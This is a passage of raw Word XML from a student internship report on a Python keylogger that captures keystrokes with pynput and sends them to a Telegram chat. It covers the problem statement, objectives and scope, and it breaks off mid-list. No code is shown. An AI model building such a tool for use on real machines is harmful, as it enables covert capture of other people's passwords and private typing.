        <w:t>“Python-Based Keylogger with Telegram Reporting”</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, was developed as part of my internship. The system captures keystrokes in real time using Python’s </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> library and periodically sends reports to a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram chat</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> via the </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram Bot API</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>, replacing the email-based reporting used in traditional designs. This ensures that logs are delivered instantly, securely, and with lower configuration overhead compared to SMTP email systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFA1A2E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">This project not only improves programming knowledge but also emphasizes the </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>ethical use of monitoring tools</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in controlled, academic environments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECB0252" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="3158ABF0">
          <v:rect id="_x0000_i1307" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D24D2B0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>1.2 Problem Statement</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B38E0A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Organizations, educators, and individuals face challenges in monitoring computer usage:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5D093F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Employees using office computers for non-work purposes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B389A24" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Students distracted during class or study sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557E3244" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Forensic investigators needing to reconstruct user activity during an incident.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655B36B7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Lack of lightweight, affordable, and customizable monitoring tools.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774EE66A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Existing systems (commercial or freeware) have problems:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EA6BD7" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Commercial solutions</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → costly and resource-heavy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4437F058" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Freeware</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → unsafe, often bundled with malware.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310C469F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Email-based monitoring</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> → requires complex setup and may face authentication/security issues.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EFE15C2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Hence, there is a need for a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>lightweight, secure, open-source, and customizable system</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> that can deliver logs quickly and safely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34957EB5" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="31C8D19B">
          <v:rect id="_x0000_i1308" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="662AA750" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>1.3 Objectives of the Project</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D61A5CC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Academic Objectives:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76222EA4" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Apply Python programming in a real-world cybersecurity project.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186437E0" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Implement event-driven programming with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>pynput</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C04E3C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Explore multithreading for periodic reporting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0786470A" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Understand API-based communication using Telegram Bot API.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45600C0C" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Analyze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ethical implications of monitoring software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BAF1CB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Practical Objectives:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDAAC85" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Capture keystrokes in real-time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561957DC" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Store logs temporarily in memory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254C8258" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Send logs to a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Telegram chat</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> every fixed interval.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03312145" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Provide a safe exit mechanism (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>exitlog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> keyword).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED6097E" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Minimize system resource consumption.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4436EDCF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="001E02BA">
          <v:rect id="_x0000_i1309" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4DF02D" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>1.4 Scope of the Project</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0396E2" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">The scope of this project is limited to creating a </w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>proof-of-concept Python keylogger</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> that sends keystroke logs to a Telegram chat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C04036" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>In-Scope:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016BFE82" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Real-time keystroke logging.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270F7F1F" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Periodic Telegram reporting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188C7D17" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Controlled exit with a command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A79C81" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Cross-platform support (Windows/Linux).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192BEB74" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Out-of-Scope:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F47032" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Advanced surveillance (screenshots, webcam, mic).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70810AB3" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>AI-based monitoring.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21845B62" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Mobile (Android/iOS) implementation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB276DF" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:pict w14:anchorId="1A5B3DC3">
          <v:rect id="_x0000_i1310" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="728732A8" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>1.5 Existing System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AF5BBB" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Existing monitoring solutions include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5EE2C9" w14:textId="77777777" w:rsidR="00497ED2" w:rsidRPr="00497ED2" w:rsidRDefault="00497ED2" w:rsidP="00497ED2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Commercial Monitoring Tools</w:t>
      </w:r>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Refog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>Spyrix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00497ED2">
        <w:rPr>
